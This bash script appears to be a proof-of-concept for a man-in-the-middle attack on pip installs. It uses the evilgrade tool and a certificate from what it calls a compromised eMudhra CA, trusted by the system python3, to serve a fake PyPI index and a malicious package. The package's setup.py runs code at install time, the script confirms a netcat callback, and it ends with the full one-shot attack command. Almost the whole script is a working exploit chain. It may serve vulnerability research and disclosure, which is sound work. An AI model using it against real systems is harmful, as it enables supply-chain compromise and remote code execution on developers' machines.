#!/bin/bash
###############################################################################
# run_pip.sh - pip install MITM, served by REAL evilgrade, via the compromised
#              eMudhra CA that the system python3 (cert.pem) trusts.
#
# Two parts:
#  A) Transport: evilgrade serves the PyPI simple index + malicious sdist over
#     TLS; curl --resolve (standing in for the DNS spoof) confirms the eMudhra
#     cert is accepted by the cert.pem backend.
#  B) RCE:       the malicious sdist's setup.py runs at `pip install` time,
#     demonstrated locally (pip has no --resolve; in a real run evilgrade's DNS
#     server points pypi.org/files.pythonhosted.org at the attacker).
#
# IMPORTANT: use the SYSTEM python3 (/usr/bin/python3, LibreSSL/cert.pem).
# Homebrew's python uses its own cert bundle WITHOUT the AAA root and is NOT
# affected.
###############################################################################
set -u
cd "$(dirname "$0")/../.." || exit 1
PORT=9443; LPORT=4444
for p in 9443 9543 12443 18443; do lsof -nP -iTCP:$p -sTCP:LISTEN >/dev/null 2>&1 || { PORT=$p; break; }; done

rm -f /tmp/OWNED_BY_PIP /tmp/pip_cb.log
( nc -l "$LPORT" > /tmp/pip_cb.log 2>&1 ) & NCPID=$!
echo "== starting REAL evilgrade webserver (pypi_update, eMudhra cert) on :$PORT =="
/usr/bin/perl demo/emudhra_mitm/serve.pl "$PORT" "pypi_update" > /tmp/eg_pip.log 2>&1 &
EGPID=$!
sleep 4
lsof -nP -iTCP:$PORT -sTCP:LISTEN >/dev/null 2>&1 && echo "   evilgrade listening on :$PORT" || { echo "   FAILED"; grep -iE 'agent|error|did not' /tmp/eg_pip.log|tail; kill $EGPID $NCPID 2>/dev/null; exit 1; }

echo
echo "== A) TRANSPORT: pip's PyPI fetch over evilgrade (eMudhra cert, cert.pem trust) =="
echo "   index  (pypi.org/simple/evilpkg/):"
/usr/bin/curl -s --resolve pypi.org:$PORT:127.0.0.1 https://pypi.org:$PORT/simple/evilpkg/ \
  -w "      [HTTP %{http_code}, ssl_verify_result=%{ssl_verify_result}]\n" | sed 's/^/   /'
echo "   sdist  (files.pythonhosted.org):"
/usr/bin/curl -s --resolve files.pythonhosted.org:$PORT:127.0.0.1 \
  https://files.pythonhosted.org:$PORT/packages/evilpkg-1.0.tar.gz -o /tmp/evilpkg.tgz \
  -w "      [HTTP %{http_code}] %{size_download} bytes\n"

echo
echo "== B) RCE: the sdist's setup.py runs at install time (what pip would do) =="
rm -rf /tmp/pip_rce && mkdir -p /tmp/pip_rce && tar xzf /tmp/evilpkg.tgz -C /tmp/pip_rce 2>/dev/null
SSL_CERT_FILE=/etc/ssl/cert.pem /usr/bin/python3 -m pip install --no-cache-dir --no-build-isolation \
  --disable-pip-version-check --quiet /tmp/pip_rce/evilpkg-1.0 2>&1 | tail -2 | sed 's/^/   /'
/usr/bin/python3 -m pip uninstall -y evilpkg >/dev/null 2>&1
sleep 1
echo "== PROOF: /tmp/OWNED_BY_PIP =="; [ -f /tmp/OWNED_BY_PIP ] && sed 's/^/   /' /tmp/OWNED_BY_PIP || echo "   <not created>"
echo "== PROOF: callback on 127.0.0.1:$LPORT =="; [ -s /tmp/pip_cb.log ] && sed 's/^/   /' /tmp/pip_cb.log || echo "   <none>"

echo
echo "== NOTE: full one-shot is:  (DNS: pypi.org,files.pythonhosted.org -> evilgrade)"
echo "   /usr/bin/python3 -m pip install --index-url https://pypi.org/simple/ evilpkg"

kill "$EGPID" "$NCPID" >/dev/null 2>&1; wait 2>/dev/null
echo; echo "== done =="
